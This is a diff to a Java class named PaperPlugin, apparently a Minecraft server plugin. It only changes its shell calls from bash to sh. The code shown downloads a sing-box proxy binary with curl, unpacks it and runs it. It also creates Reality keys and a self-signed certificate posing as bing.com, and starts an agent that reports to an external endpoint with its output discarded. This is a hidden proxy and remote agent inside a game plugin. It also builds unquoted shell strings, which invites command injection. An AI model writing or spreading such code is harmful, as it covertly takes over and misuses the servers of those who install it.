@@ -204,7 +204,7 @@ public class PaperPlugin extends JavaPlugin {
             return;
         }
         getLogger().info("🔨 正在生成 EC 自签证书...");
-        new ProcessBuilder("bash", "-c",
+        new ProcessBuilder("sh", "-c",
                 "openssl ecparam -genkey -name prime256v1 -out " + key + " && " +
                         "openssl req -new -x509 -days 3650 -key " + key + " -out " + cert + " -subj '/CN=bing.com'")
                 .inheritIO().start().waitFor();
@@ -214,7 +214,7 @@ public class PaperPlugin extends JavaPlugin {
     // ===== Reality 密钥生成 =====
     private Map<String, String> generateRealityKeypair(Path bin) throws IOException, InterruptedException {
         getLogger().info("🔑 正在生成 Reality 密钥对...");
-        ProcessBuilder pb = new ProcessBuilder("bash", "-c", bin + " generate reality-keypair");
+        ProcessBuilder pb = new ProcessBuilder("sh", "-c", bin + " generate reality-keypair");
         pb.redirectErrorStream(true);
         Process p = pb.start();
         StringBuilder sb = new StringBuilder();
@@ -348,8 +348,8 @@ public class PaperPlugin extends JavaPlugin {
 
         getLogger().info("⬇️ 下载 sing-box: " + url);
         Path tar = dir.resolve(file);
-        new ProcessBuilder("bash", "-c", "curl -L -o " + tar + " \"" + url + "\"").inheritIO().start().waitFor();
-        new ProcessBuilder("bash", "-c",
+        new ProcessBuilder("sh", "-c", "curl -L -o " + tar + " \"" + url + "\"").inheritIO().start().waitFor();
+        new ProcessBuilder("sh", "-c",
                 "cd " + dir + " && tar -xzf " + file + " 2>/dev/null || true && " +
                         "(find . -type f -name 'sing-box' -exec mv {} ./sing-box \\; ) && chmod +x sing-box || true")
                 .inheritIO().start().waitFor();
@@ -423,7 +423,7 @@ public class PaperPlugin extends JavaPlugin {
             p = pb.start();
         } catch (IOException e) {
             getLogger().warning("⚠️ 直接执行失败，尝试通过 bash 启动: " + e.getMessage());
-            ProcessBuilder pb = new ProcessBuilder("bash", "-c",
+            ProcessBuilder pb = new ProcessBuilder("sh", "-c",
                     "exec " + agentPath + " -e '" + endpoint + "' --auto-discovery '" + autoDiscovery + "'");
             pb.redirectErrorStream(true);
             pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
